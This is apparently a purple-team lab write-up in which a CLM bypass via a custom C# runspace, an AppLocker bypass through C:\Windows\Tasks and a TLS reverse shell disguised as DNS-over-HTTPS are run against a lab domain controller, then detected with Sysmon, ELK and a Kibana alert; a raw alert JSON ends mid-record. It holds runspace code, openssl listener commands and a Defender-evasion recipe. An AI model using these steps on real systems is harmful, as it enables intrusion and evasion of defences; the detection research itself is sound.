# CLM Bypass + TLS Reverse Shell: Purple Team Detection Lab
**Date:** 2026-03-23  
**Author:** Osher Jacobs  
**Repository:** [osherjacobs/AD-Lab-Research](https://github.com/osherjacobs/AD-Lab-Research)

---

## Overview

End-to-end purple team exercise: establish an encrypted reverse shell via CLM bypass on a Windows Server 2019 Domain Controller, capture the full attack chain in ELK via Sysmon and Winlogbeat, identify configuration gaps in default monitoring rules, and build a live Kibana detection alert from empirical telemetry.

Tested against both Windows 11 Enterprise (December 2025) and Windows Server 2019 (March 2026 lab). See [December 2025 historical note](#december-2025-defender-bypass--historical-reference) for AV evasion results under the earlier build.

---

## Environment

| Component | Details |
|---|---|
| Target (current lab) | Windows Server 2019 — DC01.lab2019.local (192.168.1.4) |
| Target (December 2025) | Windows 11 Enterprise — fully patched at time of test |
| Attacker | Kali Linux (192.168.1.218) |
| SIEM | ELK stack (192.168.1.250) |
| Log shipper | Winlogbeat 8.19.12 |
| Sysmon | v15.15, SwiftOnSecurity config (modified — see below) |
| AV state | Defender disabled for lab execution phase (Server 2019) |

---

## Attack Chain

### 1. CLM Bypass — Custom C# Runspace

PowerShell ConstrainedLanguage Mode (CLM) is enforced system-wide via AppLocker policy. CLM enforcement lives in the PowerShell host process — programmatically created runspaces default to FullLanguage and do not inherit the system policy.

Bypass achieved by compiling a .NET Framework 4.8 C# binary that creates a FullLanguage runspace via `RunspaceFactory.CreateRunspace()`. No configuration required. The TLS reverse shell payload is embedded as a hardcoded string — no ps1 written to disk.

```csharp
Runspace runspace = RunspaceFactory.CreateRunspace();
runspace.Open();
PowerShell ps = PowerShell.Create();
ps.Runspace = runspace;
ps.AddScript(payload);
ps.Invoke();
runspace.Close();
```

**Verified post-shell:**
```
SHELL> $ExecutionContext.SessionState.LanguageMode
FullLanguage
```

CLM bypass via custom runspace is architectural — Microsoft does not treat it as a security boundary and issues no patches for it. This technique remains unpatched by design.

---

### 2. AppLocker Bypass — Execution from C:\Windows\Tasks

AppLocker blocked execution from standard user-writable paths (Desktop, Downloads). `C:\Windows\Tasks` satisfies two conditions simultaneously:

- Writable by standard users
- Falls within the `%WINDIR%\*` allowed path in default AppLocker executable rules

This is not obscure tradecraft. `C:\Windows\Tasks` as an AppLocker bypass has been publicly documented for years and appears in every AppLocker bypass reference. It works on default configurations in 2026. The fact that it remains unaddressed in default deployments is, to put it plainly, indefensible — analogous to the years-long window between ADCS ESC vulnerabilities being known and organizations actually closing them.

Binary copied to `C:\Windows\Tasks\` and executed successfully.

---

### 3. TLS Reverse Shell — Encrypted C2 Channel

Reverse shell payload embedded in C# binary. TLS encrypts the channel and blends with legitimate HTTPS traffic.

**Listener (Kali):**
```bash
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=cloudflare-dns.com"
openssl s_server -quiet -key key.pem -cert cert.pem -port 443
```

**Key characteristics:**
- SNI set to `cloudflare-dns.com` — mimics DNS-over-HTTPS traffic on port 443
- Self-signed cert accepted via disabled validation callback
- Connection made directly by IP — no DNS resolution occurs
- Payload never exists as a file on disk

**Shell confirmed on DC01 (Server 2019):**
```
SHELL> whoami
lab2019\administrator
SHELL> hostname
DC01
SHELL> $ExecutionContext.SessionState.LanguageMode
FullLanguage
```

---

## AMSI Findings

With Defender enabled, all payload variants were blocked before execution on both Windows 11 Enterprise and Windows Server 2019 (March 2026):

| Attempt | Detection | Notes |
|---|---|---|
| Plaintext ps1 | `Trojan:PowerShell/ReverseShell.HAB!MTB` | Static signature on TLS shell content |
| Embedded payload in C# binary | `Trojan:PowerShell/ReverseShell.HAB!MTB` | AMSI scanning decoded PS string at parse time |
| Split-string AMSI bypass prepended | Caught at AMSI bypass line | Signature on `AmsiUtils`/`amsiInitFailed` pattern |
| P/Invoke `AmsiScanBuffer` patch | `VirTool:MSIL/AmsiTamper.C` | Caught at binary copy — static signature on patch bytes |

**Finding:** The C# vehicle itself evades detection. It is the embedded PowerShell payload that is signatured. The CLM bypass mechanism remains clean — it is the PS content that Microsoft now recognises. All publicly documented AMSI bypass techniques tested were blocked on fully patched systems as of March 2026.

This finding is consistent with earlier research documenting 10 PS-layer obfuscation attempts against AMSI — all blocked. Moving to a compiled C# vehicle is the logical next step once PS-layer evasion is exhausted. See [AMSI Bypass Research: Obfuscation vs. Modern Defenses](https://github.com/osherjacobs/AD-Lab-Research/blob/main/AMSI-Bypass-Research.md) for the full breakdown.

See [December 2025 historical note](#december-2025-defender-bypass--historical-reference) for context on why this worked three months ago.

---

## Detection Telemetry — ELK

### Critical Finding: Default Sysmon Config Gap

The SwiftOnSecurity Sysmon configuration — the de facto standard deployment baseline used by the majority of Sysmon deployments — includes the following `NetworkConnect` include rule:

```xml
<NetworkConnect onmatch="include">
    <Image name="Usermode" condition="begin with">C:\Users</Image>
    ...
</NetworkConnect>
```

Execution from `C:\Windows\Tasks\` falls entirely outside this include rule. **No EID 3 network connection events were generated until the config was manually updated.**

This is the same gap that makes `C:\Windows\Tasks` valuable as an AppLocker bypass in the first place — and it propagates directly into the monitoring layer. One path choice defeats AppLocker execution controls *and* Sysmon network telemetry simultaneously. `C:\Windows\Tasks` has been a documented AppLocker bypass for years. The absence of this path from the standard Sysmon NetworkConnect rules is a gap that should not exist in 2026.

**Config fix — one line:**
```xml
<NetworkConnect onmatch="include">
    <Image name="Usermode" condition="begin with">C:\Users</Image>
    <Image name="Tasks" condition="begin with">C:\Windows\Tasks</Image>
    ...
</NetworkConnect>
```

If you are running the SwiftOnSecurity config unmodified, you are blind to network connections originating from this execution path. Check your config.

---

### EID 1 — Process Create

```
Image:              C:\Windows\Tasks\CLMBypassa.exe
ParentImage:        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine:  powershell -ep bypass
User:               LAB2019\Administrator
IntegrityLevel:     High
CurrentDirectory:   C:\Windows\Tasks\
Company:            -
MD5:                401488CAACAB52DFDBC9C69BCEB93007
SHA256:             0B0A0BEF9DE5B6773CA209F7008FCDEBEC15E823D5A90A04A08DD24F1AE73EB3
```

**Detection signals:**
- Executable in `C:\Windows\Tasks\` — not a legitimate binary location
- No Company/Publisher field — unsigned binary
- Parent process `powershell -ep bypass` — high-signal parent chain
- High integrity context under administrator account

---

### EID 3 — Network Connection (post config fix)

```
Image:                C:\Windows\Tasks\CLMBypassa.exe
DestinationIp:        192.168.1.218
DestinationPort:      443
DestinationHostname:  -
SourceIp:             192.168.1.4
Protocol:             tcp
Initiated:            true
RuleName:             Tasks
```

**Detection signals:**
- Outbound 443 from unsigned binary in `C:\Windows\Tasks\`
- `DestinationHostname` empty — direct IP connection, no DNS resolution
- No corresponding EID 22 DNS query preceding the connection
- `cloudflare-dns.com` SNI against a private RFC1918 destination — immediate anomaly in Zeek `ssl.log`

The SNI/RFC1918 mismatch is the highest-confidence network IOC. A TLS connection advertising `cloudflare-dns.com` terminating at a private IP address is not legitimate traffic under any normal operating condition.

---

### Kibana Alert

Alert built directly from empirical lab telemetry and deployed as a live detection rule in ELK Security.

**Rule configuration:**
```
Name:        Sysmon - Binary Execution from Windows Tasks
Type:        Custom Query
Severity:    High
Risk Score:  73
Schedule:    Every 5 minutes
Tags:        Sysmon, AppLocker-Bypass, Defense-Evasion
Description: Detects binary execution from C:\Windows\Tasks - a well-documented 
             AppLocker bypass path. Any execution from this location should be 
             treated as suspicious.

Query:
event.provider: "Microsoft-Windows-Sysmon" 
AND event.code: 1 
AND winlog.event_data.CurrentDirectory: "C:\\Windows\\Tasks\\"
```

**Alert firing — key fields from triggered event:**

```
winlog.event_data.ParentImage:        C:\Windows\Tasks\CLMBypassa.exe
winlog.event_data.ParentCommandLine:  "C:\Windows\Tasks\CLMBypassa.exe"
winlog.event_data.CurrentDirectory:   C:\Windows\Tasks\
winlog.event_data.IntegrityLevel:     High
winlog.event_data.User:               LAB2019\Administrator
kibana.alert.rule.name:               Sysmon - Binary Execution from Windows Tasks
kibana.alert.severity:                high
kibana.alert.risk_score:              73
kibana.alert.status:                  active
```

4 high-severity alerts fired. Notably, the rule caught child process activity (`ipconfig.exe`) spawned by `CLMBypassa.exe` — demonstrating detection one level deeper than the initial execution event. The parent-child relationship is fully preserved in the telemetry.

---

### Kibana Queries

```
# Process creation from Tasks
event.provider: "Microsoft-Windows-Sysmon" AND event.code: 1 AND winlog.event_data.Image: *CLMBypass*

# Network connection from Tasks
event.provider: "Microsoft-Windows-Sysmon" AND event.code: 3 AND winlog.event_data.Image: *CLMBypass*

# Broad: any binary in Tasks making network connections
event.provider: "Microsoft-Windows-Sysmon" AND event.code: 3 AND winlog.event_data.Image: *Windows\\Tasks*

# Outbound 443 with no destination hostname resolution
event.provider: "Microsoft-Windows-Sysmon" AND event.code: 3 AND winlog.event_data.DestinationPort: 443 AND winlog.event_data.DestinationHostname: "-"
```

---

## Detection Summary

| Layer | Signal | Status |
|---|---|---|
| Defender AV | `Trojan:PowerShell/ReverseShell.HAB!MTB` | Fired — blocked execution |
| Sysmon EID 1 | Unsigned binary from `C:\Windows\Tasks\` spawned by `powershell -ep bypass` | Captured |
| Sysmon EID 3 | Outbound 443 to private IP, no hostname resolution | Captured (after config fix) |
| Kibana Alert | `Sysmon - Binary Execution from Windows Tasks` — 4 high alerts | Fired |
| Zeek ssl.log | SNI `cloudflare-dns.com` → RFC1918 destination | Expected — not verified this session |
| Sysmon EID 7 | `amsi.dll` / `SMA.dll` load by non-standard host | Not captured — ImageLoad disabled in config |
| PowerShell EID 4104 | ScriptBlock logging from custom runspace | Not verified — separate test warranted |

**Key finding:** The SIEM captured the full attack chain regardless of whether the payload executed. Detection does not depend on evasion success. Blocked attempts and successful execution produce the same telemetry footprint.

---

## Configuration Gaps Identified

1. **Default Sysmon NetworkConnect rule** — `C:\Windows\Tasks\` absent from include rules despite being a well-documented AppLocker bypass path for years. One-line fix. No excuse for this gap in production deployments.
2. **Sysmon ImageLoad disabled** — `amsi.dll` and `System.Management.Automation.dll` load events not captured. Enabling EID 7 adds DLL load chain visibility from non-standard host processes.
3. **EID 4104 ScriptBlock logging** — behaviour of custom runspace against ScriptBlock logging policy not verified. Separate test warranted.
4. **Zeek SNI correlation** — not verified this session. High-confidence IOC available: `cloudflare-dns.com` SNI against RFC1918 destination in `ssl.log`.

---

## IOCs

| Type | Value |
|---|---|
| SHA256 | `0B0A0BEF9DE5B6773CA209F7008FCDEBEC15E823D5A90A04A08DD24F1AE73EB3` |
| MD5 | `401488CAACAB52DFDBC9C69BCEB93007` |
| Execution path | `C:\Windows\Tasks\*.exe` |
| TLS SNI | `cloudflare-dns.com` → RFC1918 destination |
| Network | Outbound TCP/443 from `C:\Windows\Tasks\` with no hostname resolution |

---

## December 2025 Defender Bypass — Historical Reference

**Date:** 2025-12-24  
**Platform:** Windows 11 Enterprise — fully patched at time of test  
**Defender state:** Real-time protection, cloud-delivered protection, Dev Drive protection, and tamper protection all ON  

### What Worked

Same CLM bypass binary used as execution vehicle. Payload sourced from revshells.com — PowerShell TLS reverse shell #4, base64-encoded UTF-8, passed as a command-line argument. No AMSI bypass prepended. No obfuscation beyond base64 encoding.

```
.\CLMBypass.exe <base64_encoded_tls_shell>
```

Shell landed. Confirmed:

```
SHELL> $ExecutionContext.SessionState.LanguageMode
FullLanguage
SHELL> whoami
desktop-rd3160s\oj
```

Windows Security panel confirmed all four Defender protection layers active during the shell session. Screenshot retained.

### Controlled Variable Test — March 2026

Original December binary redeployed unchanged on both Windows 11 Enterprise and Windows Server 2019 in March 2026. Blocked immediately on both — `Trojan:PowerShell/ReverseShell.HAB!MTB`.

Same binary. Same payload. Different result 90 days later.

### Analysis

The CLM bypass mechanism is unchanged and unpatched — it remains architectural. The C# vehicle itself still evades detection. It is the embedded PowerShell payload that Microsoft signatured between December 2025 and March 2026.

The revshells.com TLS shell pattern was not in Defender's signature database in December 2025. It is now. Offensive tooling has a shelf life. The ~90-day window this technique remained viable is a data point worth recording.

**Detection layer conclusion:** ELK captured the full attack chain in both scenarios. The SIEM is indifferent to whether evasion succeeds. The kill chain is visible either way.

---
<img width="1871" height="969" alt="devmachinecsharpCLM" src="https://github.com/user-attachments/assets/329a7750-8026-4385-8c9f-f906c23aeaa4" />
<img width="1143" height="592" alt="kalirevshell" src="https://github.com/user-attachments/assets/bb515727-8a28-4d72-ab82-237e051e8e8e" />
<img width="1165" height="735" alt="kibanaclmbypass" src="https://github.com/user-attachments/assets/d3f815f8-6ed9-430b-bbe2-742260ed317a" />
<img width="1882" height="1051" alt="kibanalertrevshelwintasks" src="https://github.com/user-attachments/assets/bd1eaa08-4eca-45a9-a409-90708ad04885" />

{
  "_index": ".internal.alerts-security.alerts-default-000001",
  "_id": "e583ae0bf38d3c8ae952485bda86f3607f9a8571ff3c09673365bbab23f02dde",
  "_score": 1,
  "_source": {
    "kibana.alert.rule.execution.timestamp": "2026-03-23T15:09:47.447Z",
    "kibana.alert.start": "2026-03-23T15:09:47.447Z",
    "kibana.alert.last_detected": "2026-03-23T15:09:47.447Z",
    "kibana.version": "8.19.12",
    "kibana.alert.rule.parameters": {
      "description": "Detects binary execution from C:\\Windows\\Tasks - a well-documented AppLocker bypass path. Any execution from this location should be treated as suspicious",
      "risk_score": 73,
      "severity": "high",
      "license": "",
      "meta": {
        "kibana_siem_app_url": "http://localhost:5601/app/security"
      },
      "author": [],
      "false_positives": [],
      "from": "now-6m",
      "rule_id": "fb8585fa-7191-4f86-99d1-169743c114fc",
      "max_signals": 100,
      "risk_score_mapping": [],
      "severity_mapping": [],
      "threat": [],
      "to": "now",
      "references": [],
      "version": 1,
      "exceptions_list": [],
      "immutable": false,
      "rule_source": {
        "type": "internal"
      },
      "related_integrations": [],
      "required_fields": [],
      "setup": "",
      "type": "query",
      "language": "kuery",
      "index": [
        "apm-*-transaction*",
        "auditbeat-*",
        "endgame-*",
        "filebeat-*",
        "logs-*",
        "packetbeat-*",
        "traces-apm*",
        "winlogbeat-*",
        "-*elastic-cloud-logs-*"
      ],
      "query": "event.provider: \"Microsoft-Windows-Sysmon\" AND event.code: 1 AND winlog.event_data.CurrentDirectory: \"C:\\\\Windows\\\\Tasks\\\\\"",
      "filters": []
    },
    "kibana.alert.rule.category": "Custom Query Rule",
    "kibana.alert.rule.consumer": "siem",
    "kibana.alert.rule.execution.uuid": "94dde0f7-86bd-4415-9671-b99f61f1cc93",
    "kibana.alert.rule.name": "Sysmon - Binary Execution from Windows Tasks",
    "kibana.alert.rule.producer": "siem",
    "kibana.alert.rule.revision": 0,
    "kibana.alert.rule.rule_type_id": "siem.queryRule",
    "kibana.alert.rule.uuid": "8f430f4d-58cb-42df-a73b-3e740dc28bb8",
    "kibana.space_ids": [
      "default"
    ],
    "kibana.alert.rule.tags": [
      "Sysmon AppLocker-Bypass Defense-Evasion"
    ],
    "@timestamp": "2026-03-23T15:09:47.402Z",
    "event": {
      "action": "Process Create (rule: ProcessCreate)",
      "created": "2026-03-23T15:05:40.535Z",
      "code": "1",
      "provider": "Microsoft-Windows-Sysmon"
    },
    "log": {
      "level": "information"
    },
    "message": "Process Create:\nRuleName: -\nUtcTime: 2026-03-23 15:05:39.308\nProcessGuid: {6e4a868b-56c3-69c1-0202-000000001500}\nProcessId: 6048\nImage: C:\\Windows\\SysWOW64\\ipconfig.exe\nFileVersion: 10.0.17763.1 (WinBuild.160101.0800)\nDescription: IP Configuration Utility\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: ipconfig.exe\nCommandLine: \"C:\\Windows\\system32\\ipconfig.exe\"\nCurrentDirectory: C:\\Windows\\Tasks\\\nUser: LAB2019\\Administrator\nLogonGuid: {6e4a868b-378b-69c1-b204-070000000000}\nLogonId: 0x704B2\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: MD5=B8CB2DFCA7379908B0605331A759AF4C,SHA256=B0832DEC07A4CB6228B7B392D6ABAFB79E9BF7327605AE3E86E1E617DE7495A5,IMPHASH=98CEEAF3EB55DE32686F14F2CF79FC6F\nParentProcessGuid: {6e4a868b-56b2-69c1-ff01-000000001500}\nParentProcessId: 6412\nParentImage: C:\\Windows\\Tasks\\CLMBypassa.exe\nParentCommandLine: \"C:\\Windows\\Tasks\\CLMBypassa.exe\"\nParentUser: LAB2019\\Administrator",
    "host": {
      "name": "DC01.lab2019.local"
    },
    "ecs": {
      "version": "8.0.0"
    },
    "agent": {
      "version": "8.19.12",
      "ephemeral_id": "44c7493a-e825-4822-a803-977c6614c9c6",
      "id": "1751edc0-760c-4637-bf88-257c35b4f211",
      "name": "DC01",
      "type": "winlogbeat",
      "hostname": "DC01"
    },
    "winlog": {
      "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
      "channel": "Microsoft-Windows-Sysmon/Operational",
      "provider_name": "Microsoft-Windows-Sysmon",
      "record_id": 8476,
      "computer_name": "DC01.lab2019.local",
      "user": {
        "name": "SYSTEM",
        "type": "User",
        "identifier": "S-1-5-18",
        "domain": "NT AUTHORITY"
      },
      "event_data": {
        "UtcTime": "2026-03-23 15:05:39.308",
        "Company": "Microsoft Corporation",
        "ParentImage": "C:\\Windows\\Tasks\\CLMBypassa.exe",
        "User": "LAB2019\\Administrator",
        "Image": "C:\\Windows\\SysWOW64\\ipconfig.exe",
        "OriginalFileName": "ipconfig.exe",
        "ParentProcessId": "6412",
        "ProcessId": "6048",
        "LogonGuid": "{6e4a868b-378b-69c1-b204-070000000000}",
        "ParentProcessGuid": "{6e4a868b-56b2-69c1-ff01-000000001500}",
        "FileVersion": "10.0.17763.1 (WinBuild.160101.0800)",
        "TerminalSessionId": "1",
        "ParentCommandLine": "\"C:\\Windows\\Tasks\\CLMBypassa.exe\"",
        "CommandLine": "\"C:\\Windows\\system32\\ipconfig.exe\"",
        "Product": "Microsoft® Windows® Operating System",
        "ProcessGuid": "{6e4a868b-56c3-69c1-0202-000000001500}",
        "Description": "IP Configuration Utility",
        "Hashes": "MD5=B8CB2DFCA7379908B0605331A759AF4C,SHA256=B0832DEC07A4CB6228B7B392D6ABAFB79E9BF7327605AE3E86E1E617DE7495A5,IMPHASH=98CEEAF3EB55DE32686F14F2CF79FC6F",
        "RuleName": "-",
        "ParentUser": "LAB2019\\Administrator",
        "CurrentDirectory": "C:\\Windows\\Tasks\\",
        "LogonId": "0x704b2",
        "IntegrityLevel": "High"
      },
      "process": {
        "pid": 3212,
        "thread": {
          "id": 4916
        }
      },
      "event_id": "1",
      "opcode": "Info",
      "version": 5,
      "api": "wineventlog",
      "task": "Process Create (rule: ProcessCreate)"
    },
    "kibana.alert.original_event.action": "Process Create (rule: ProcessCreate)",
    "kibana.alert.original_event.created": "2026-03-23T15:05:40.535Z",
    "kibana.alert.original_event.code": "1",
    "kibana.alert.original_event.kind": "event",
    "kibana.alert.original_event.provider": "Microsoft-Windows-Sysmon",
    "event.kind": "signal",
    "kibana.alert.original_time": "2026-03-23T15:05:39.309Z",
    "kibana.alert.ancestors": [
      {
        "id": "5b87G50Bg45ehbJcBQbS",
        "type": "event",
        "index": ".ds-winlogbeat-8.19.12-2026.03.19-000001",
        "depth": 0
      }
    ],
    "kibana.alert.status": "active",
    "kibana.alert.workflow_status": "open",
    "kibana.alert.depth": 1,
    "kibana.alert.reason": "event on DC01.lab2019.local created high alert Sysmon - Binary Execution from Windows Tasks.",
    "kibana.alert.severity": "high",
    "kibana.alert.risk_score": 73,
    "kibana.alert.rule.actions": [],
    "kibana.alert.rule.author": [],
    "kibana.alert.rule.created_at": "2026-03-23T15:04:43.875Z",
    "kibana.alert.rule.created_by": "elastic",
    "kibana.alert.rule.description": "Detects binary execution from C:\\Windows\\Tasks - a well-documented AppLocker bypass path. Any execution from this location should be treated as suspicious",
    "kibana.alert.rule.enabled": true,
    "kibana.alert.rule.exceptions_list": [],
    "kibana.alert.rule.false_positives": [],
    "kibana.alert.rule.from": "now-6m",
    "kibana.alert.rule.immutable": false,
    "kibana.alert.rule.interval": "5m",
    "kibana.alert.rule.indices": [
      "apm-*-transaction*",
      "auditbeat-*",
      "endgame-*",
      "filebeat-*",
      "logs-*",
      "packetbeat-*",
      "traces-apm*",
      "winlogbeat-*",
      "-*elastic-cloud-logs-*"
    ],
    "kibana.alert.rule.license": "",
    "kibana.alert.rule.max_signals": 100,
    "kibana.alert.rule.references": [],
    "kibana.alert.rule.risk_score_mapping": [],
    "kibana.alert.rule.rule_id": "fb8585fa-7191-4f86-99d1-169743c114fc",
    "kibana.alert.rule.severity_mapping": [],
    "kibana.alert.rule.threat": [],
    "kibana.alert.rule.to": "now",
    "kibana.alert.rule.type": "query",
    "kibana.alert.rule.updated_at": "2026-03-23T15:04:43.875Z",
    "kibana.alert.rule.updated_by": "elastic",
    "kibana.alert.rule.version": 1,
    "kibana.alert.uuid": "e583ae0bf38d3c8ae952485bda86f3607f9a8571ff3c09673365bbab23f02dde",
    "kibana.alert.workflow_tags": [],
    "kibana.alert.workflow_assignee_ids": [],
    "kibana.alert.rule.meta.kibana_siem_app_url": "http://localhost:5601/app/security",
    "kibana.alert.rule.risk_score": 73,
    "kibana.alert.rule.severity": "high",
    "kibana.alert.intended_timestamp": "2026-03-23T15:09:47.402Z",
    "kibana.alert.rule.execution.type": "scheduled"
  },
  "fields": {
    "kibana.alert.severity": [
      "high"
    ],
    "kibana.alert.rule.updated_by": [
      "elastic"
    ],
    "signal.ancestors.depth": [
      0
    ],
    "winlog.event_data.ProcessGuid": [
      "{6e4a868b-56c3-69c1-0202-000000001500}"
    ],
    "kibana.alert.rule.tags": [
      "Sysmon AppLocker-Bypass Defense-Evasion"
    ],
    "signal.original_event.created": [
      "2026-03-23T15:05:40.535Z"
    ],
    "winlog.process.pid": [
      3212
    ],
    "kibana.alert.reason.text": [
      "event on DC01.lab2019.local created high alert Sysmon - Binary Execution from Windows Tasks."
    ],
    "winlog.event_data.ParentImage": [
      "C:\\Windows\\Tasks\\CLMBypassa.exe"
    ],
    "kibana.alert.ancestors.depth": [
      0
    ],
    "signal.rule.enabled": [
      "true"
    ],
    "signal.rule.max_signals": [
      100
    ],
    "kibana.alert.risk_score": [
      73
    ],
    "signal.rule.updated_at": [
      "2026-03-23T15:04:43.875Z"
    ],
    "agent.name": [
      "DC01"
    ],
    "winlog.event_data.UtcTime": [
      "2026-03-23 15:05:39.308"
    ],
    "winlog.event_data.OriginalFileName": [
      "ipconfig.exe"
    ],
    "winlog.event_data.Company": [
      "Microsoft Corporation"
    ],
    "winlog.event_data.RuleName": [
      "-"
    ],
    "signal.original_event.code": [
      "1"
    ],
    "winlog.event_data.User": [
      "LAB2019\\Administrator"
    ],
    "kibana.alert.rule.interval": [
      "5m"
    ],
    "kibana.alert.rule.type": [
      "query"
    ],
    "agent.hostname": [
      "DC01"
    ],
    "kibana.alert.start": [
      "2026-03-23T15:09:47.447Z"
    ],
    "event.provider": [
      "Microsoft-Windows-Sysmon"
    ],
    "kibana.alert.rule.immutable": [
      "false"
    ],
    "event.code": [
      "1"
    ],
    "winlog.event_data.FileVersion": [
      "10.0.17763.1 (WinBuild.160101.0800)"
    ],
    "agent.id": [
      "1751edc0-760c-4637-bf88-257c35b4f211"
    ],
    "signal.rule.from": [
      "now-6m"
    ],
    "winlog.event_data.LogonGuid": [
      "{6e4a868b-378b-69c1-b204-070000000000}"
    ],
    "kibana.alert.rule.enabled": [
      "true"
    ],
    "kibana.alert.rule.version": [
      "1"
    ],
    "kibana.alert.ancestors.type": [
      "event"
    ],
    "winlog.event_data.Description": [
      "IP Configuration Utility"
    ],
    "winlog.process.thread.id": [
      4916
    ],
    "signal.ancestors.index": [
      ".ds-winlogbeat-8.19.12-2026.03.19-000001"
    ],
    "agent.type": [
      "winlogbeat"
    ],
    "winlog.api": [
      "wineventlog"
    ],
    "winlog.event_data.ProcessId": [
      "6048"
    ],
    "kibana.alert.rule.max_signals": [
      100
    ],
    "kibana.alert.rule.risk_score": [
      73
    ],
    "winlog.user.name": [
      "SYSTEM"
    ],
    "kibana.alert.rule.consumer": [
      "siem"
    ],
    "kibana.alert.rule.indices": [
      "apm-*-transaction*",
      "auditbeat-*",
      "endgame-*",
      "filebeat-*",
      "logs-*",
      "packetbeat-*",
      "traces-apm*",
      "winlogbeat-*",
      "-*elastic-cloud-logs-*"
    ],
    "kibana.alert.rule.category": [
      "Custom Query Rule"
    ],
    "winlog.event_data.Image": [
      "C:\\Windows\\SysWOW64\\ipconfig.exe"
    ],
    "event.action": [
      "Process Create (rule: ProcessCreate)"
    ],
    "@timestamp": [
      "2026-03-23T15:09:47.402Z"
    ],
    "kibana.alert.original_event.action": [
      "Process Create (rule: ProcessCreate)"
    ],
    "signal.rule.updated_by": [
      "elastic"
    ],
    "winlog.channel": [
      "Microsoft-Windows-Sysmon/Operational"
    ],
    "kibana.alert.intended_timestamp": [
      "2026-03-23T15:09:47.402Z"
    ],
    "kibana.alert.rule.severity": [
      "high"
    ],
    "winlog.opcode": [
      "Info"
    ],
    "agent.ephemeral_id": [
      "44c7493a-e825-4822-a803-977c6614c9c6"
    ],
    "kibana.alert.rule.execution.timestamp": [
      "2026-03-23T15:09:47.447Z"
    ],
    "kibana.alert.rule.execution.uuid": [
      "94dde0f7-86bd-4415-9671-b99f61f1cc93"
    ],
    "kibana.alert.uuid": [
      "e583ae0bf38d3c8ae952485bda86f3607f9a8571ff3c09673365bbab23f02dde"
    ],
    "kibana.alert.rule.meta.kibana_siem_app_url": [
      "http://localhost:5601/app/security"
    ],
    "kibana.version": [
      "8.19.12"
    ],
    "winlog.event_data.TerminalSessionId": [
      "1"
    ],
    "signal.rule.license": [
      ""
    ],
    "signal.ancestors.type": [
      "event"
    ],
    "kibana.alert.rule.rule_id": [
      "fb8585fa-7191-4f86-99d1-169743c114fc"
    ],
    "signal.rule.type": [
      "query"
    ],
    "winlog.event_data.ParentProcessId": [
      "6412"
    ],
    "winlog.event_data.LogonId": [
      "0x704b2"
    ],
    "kibana.alert.ancestors.id": [
      "5b87G50Bg45ehbJcBQbS"
    ],
    "kibana.alert.original_event.code": [
      "1"
    ],
    "winlog.provider_guid": [
      "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
    ],
    "winlog.provider_name": [
      "Microsoft-Windows-Sysmon"
    ],
    "kibana.alert.rule.description": [
      "Detects binary execution from C:\\Windows\\Tasks - a well-documented AppLocker bypass path. Any execution from this location should be treated as suspicious"
    ],
    "winlog.computer_name": [
      "DC01.lab2019.local"
    ],
    "kibana.alert.rule.producer": [
      "siem"
    ],
    "kibana.alert.rule.to": [
      "now"
    ],
    "signal.rule.created_by": [
      "elastic"
    ],
    "signal.rule.interval": [
      "5m"
    ],
    "kibana.alert.rule.created_by": [
      "elastic"
    ],
    "signal.rule.id": [
      "8f430f4d-58cb-42df-a73b-3e740dc28bb8"
    ],
    "signal.reason": [
      "event on DC01.lab2019.local created high alert Sysmon - Binary Execution from Windows Tasks."
    ],
    "signal.rule.risk_score": [
      73
    ],
    "winlog.record_id": [
      8476
    ],
    "winlog.event_data.CommandLine": [
      "\"C:\\Windows\\system32\\ipconfig.exe\""
    ],
    "kibana.alert.rule.name": [
      "Sysmon - Binary Execution from Windows Tasks"
    ],
    "log.level": [
      "information"
    ],
    "host.name": [
      "DC01.lab2019.local"
    ],
    "signal.status": [
      "open"
    ],
    "winlog.event_data.ParentProcessGuid": [
      "{6e4a868b-56b2-69c1-ff01-000000001500}"
    ],
    "event.kind": [
      "signal"
    ],
    "winlog.version": [
      5
    ],
    "signal.rule.created_at": [
      "2026-03-23T15:04:43.875Z"
    ],
    "signal.rule.tags": [
      "Sysmon AppLocker-Bypass Defense-Evasion"
    ],
    "kibana.alert.workflow_status": [
      "open"
    ],
    "kibana.alert.original_event.created": [
      "2026-03-23T15:05:40.535Z"
    ],
    "kibana.alert.rule.uuid": [
      "8f430f4d-58cb-42df-a73b-3e740dc28bb8"
    ],
    "signal.original_event.provider": [
      "Microsoft-Windows-Sysmon"
    ],
    "kibana.alert.reason": [
      "event on DC01.lab2019.local created high alert Sysmon - Binary Execution from Windows Tasks."
    ],
    "signal.ancestors.id": [
      "5b87G50Bg45ehbJcBQbS"
    ],
    "signal.original_time": [
      "2026-03-23T15:05:39.309Z"
    ],
    "ecs.version": [
      "8.0.0"
    ],
    "signal.rule.severity": [
      "high"
    ],
    "kibana.alert.ancestors.index": [
      ".ds-winlogbeat-8.19.12-2026.03.19-000001"
    ],
    "event.created": [
      "2026-03-23T15:05:40.535Z"
    ],
    "agent.version": [
      "8.19.12"
    ],
    "kibana.alert.depth": [
      1
    ],
    "kibana.alert.rule.from": [
      "now-6m"
    ],
    "kibana.alert.rule.parameters": [
      {
        "severity": "high",
        "max_signals": 100,
        "rule_source": {
          "type": "internal"
        },
        "risk_score": 73,
        "query": "event.provider: \"Microsoft-Windows-Sysmon\" AND event.code: 1 AND winlog.event_data.CurrentDirectory: \"C:\\\\Windows\\\\Tasks\\\\\"",
        "description": "Detects binary execution from C:\\Windows\\Tasks - a well-documented AppLocker bypass path. Any execution from this location should be treated as suspicious",
        "index": [
          "apm-*-transaction*",
          "auditbeat-*",
          "endgame-*",
          "filebeat-*",
          "logs-*",
          "packetbeat-*",
          "traces-apm*",
          "winlogbeat-*",
          "-*elastic-cloud-logs-*"
        ],
        "language": "kuery",
        "type": "query",
        "version": 1,
        "rule_id": "fb8585fa-7191-4f86-99d1-169743c114fc",
        "license": "",
        "immutable": false,
        "meta": {
          "kibana_siem_app_url": "http://localhost:5601/app/security"
        },
        "setup": "",
        "from": "now-6m",
        "to": "now"
      }
    ],
    "kibana.alert.rule.revision": [
      0
    ],
    "signal.rule.version": [
      "1"
    ],
    "signal.original_event.kind": [
      "event"
    ],
    "kibana.alert.status": [
      "active"
    ],
    "winlog.event_data.ParentUser": [
